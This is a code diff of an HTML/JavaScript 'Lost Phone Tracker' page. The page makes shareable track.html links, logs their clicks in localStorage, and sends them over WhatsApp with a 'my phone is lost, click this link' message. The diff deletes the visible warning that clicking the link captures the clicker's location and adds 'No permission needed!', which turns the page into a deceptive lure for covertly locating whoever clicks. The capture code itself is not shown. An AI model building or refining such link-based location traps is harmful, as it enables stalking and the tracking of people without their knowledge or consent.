@@ -31,23 +31,13 @@
             color: #333;
             margin-bottom: 10px;
         }
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-        input, textarea {
+        input, textarea, select {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
             border: 2px solid #ddd;
             border-radius: 8px;
             font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        input:focus, textarea:focus {
-            outline: none;
-            border-color: #667eea;
         }
         button {
             width: 100%;
@@ -59,10 +49,6 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
-            transition: transform 0.2s;
-        }
-        button:hover {
-            transform: translateY(-2px);
         }
         .link-box {
             margin-top: 30px;
@@ -73,17 +59,6 @@
         }
         .link-box.show {
             display: block;
-            animation: slideIn 0.5s ease;
-        }
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         .tracking-link {
             background: white;
@@ -92,22 +67,6 @@
             word-break: break-all;
             font-family: monospace;
             margin: 10px 0;
-            border: 1px solid #ddd;
-        }
-        .copy-btn {
-            background: #28a745;
-            margin-top: 5px;
-        }
-        .warning {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 10px;
-            margin-top: 15px;
-            font-size: 12px;
-            color: #856404;
-        }
-        .device-list {
-            margin-top: 20px;
         }
         .device-item {
             background: #e9ecef;
@@ -115,55 +74,44 @@
             margin: 5px 0;
             border-radius: 5px;
             cursor: pointer;
-            transition: background 0.2s;
-        }
-        .device-item:hover {
-            background: #dee2e6;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h2>🔐 Lost Phone Tracker</h2>
-        <div class="subtitle">Generate a tracking link for your lost device</div>
+        <p>Generate link - No permission needed!</p>
         
-        <input type="text" id="deviceName" placeholder="Device Name (e.g., iPhone 13 Pro)" required>
-        <textarea id="contactInfo" rows="3" placeholder="Your contact info (WhatsApp/Phone/Email) - This will be shown to the finder" required></textarea>
-        <input type="text" id="reward" placeholder="Reward (Optional - e.g., $50 Reward)">
+        <input type="text" id="deviceName" placeholder="Device Name" required>
+        <textarea id="contactInfo" rows="3" placeholder="Your WhatsApp/Phone" required></textarea>
         
-        <button onclick="generateLink()">🚀 Generate Tracking Link</button>
+        <button onclick="generateLink()">🚀 Generate Link</button>
         
         <div class="link-box" id="linkBox">
-            <h3>📎 Share this link:</h3>
+            <h3>Share this link:</h3>
             <div class="tracking-link" id="trackingLink"></div>
-            <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
-            <button onclick="sendWhatsApp()">💬 Send via WhatsApp</button>
-            <div class="warning">
-                ⚠️ When someone clicks this link, their location will be captured automatically.
-                Share this link via SMS, WhatsApp, or social media.
-            </div>
+            <button onclick="copyLink()">📋 Copy Link</button>
+            <button onclick="sendWhatsApp()">💬 Send WhatsApp</button>
         </div>
 
-        <div class="device-list" id="deviceList">
-            <h3>📱 Your Tracked Devices</h3>
+        <div style="margin-top: 30px;">
+            <h3>📱 Your Devices</h3>
             <div id="savedDevices"></div>
         </div>
     </div>
 
     <script>
-        // Load saved devices on page load
         function loadDevices() {
             const devices = JSON.parse(localStorage.getItem('trackedDevices') || '[]');
             const container = document.getElementById('savedDevices');
             if (devices.length === 0) {
-                container.innerHTML = '<p style="color:#666; font-size:14px;">No devices tracked yet</p>';
+                container.innerHTML = '<p style="color:#666;">No devices yet</p>';
                 return;
             }
             container.innerHTML = devices.map(device => `
-                <div class="device-item" onclick="viewDevice('${device.id}')">
+                <div class="device-item" onclick="window.location.href='dashboard.html?id=${device.id}'">
                     <strong>${device.deviceName}</strong><br>
-                    <small>Created: ${new Date(device.createdAt).toLocaleString()}</small><br>
-                    <small>Clicks: ${device.clicks || 0}</small>
+                    <small>Clicks: ${device.clicks || 0} | ${new Date(device.createdAt).toLocaleString()}</small>
                 </div>
             `).join('');
         }
@@ -171,55 +119,43 @@
         function generateLink() {
             const deviceName = document.getElementById('deviceName').value;
             const contactInfo = document.getElementById('contactInfo').value;
-            const reward = document.getElementById('reward').value;
             
             if (!deviceName || !contactInfo) {
-                alert('Please fill device name and contact info');
+                alert('Please fill all fields');
                 return;
             }
             
-            // Generate unique ID
             const id = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
             const link = `${window.location.origin}${window.location.pathname.replace('index.html', '')}track.html?id=${id}`;
             
-            // Save to localStorage
             const devices = JSON.parse(localStorage.getItem('trackedDevices') || '[]');
             devices.push({
                 id: id,
                 deviceName: deviceName,
                 contactInfo: contactInfo,
-                reward: reward,
                 createdAt: Date.now(),
                 clicks: 0,
                 data: []
             });
             localStorage.setItem('trackedDevices', JSON.stringify(devices));
             
-            // Display link
             document.getElementById('trackingLink').innerHTML = link;
             document.getElementById('linkBox').classList.add('show');
             loadDevices();
             
-            // Clear form
             document.getElementById('deviceName').value = '';
             document.getElementById('contactInfo').value = '';
-            document.getElementById('reward').value = '';
         }
         
         function copyLink() {
             const linkText = document.getElementById('trackingLink').innerText;
             navigator.clipboard.writeText(linkText);
-            alert('Link copied to clipboard!');
+            alert('Link copied!');
         }
         
         function sendWhatsApp() {
             const link = document.getElementById('trackingLink').innerText;
-            const text = encodeURIComponent(`🔴 My phone is lost! If you find it, please click this link to help return it: ${link}`);
-            window.open(`https://wa.me/?text=${text}`, '_blank');
-        }
-        
-        function viewDevice(deviceId) {
-            window.location.href = `dashboard.html?id=${deviceId}`;
+            window.open(`https://wa.me/?text=🔴%20My%20phone%20is%20lost!%20Click%20this%20link%20to%20help:%20${encodeURIComponent(link)}`, '_blank');
         }
         
         loadDevices();
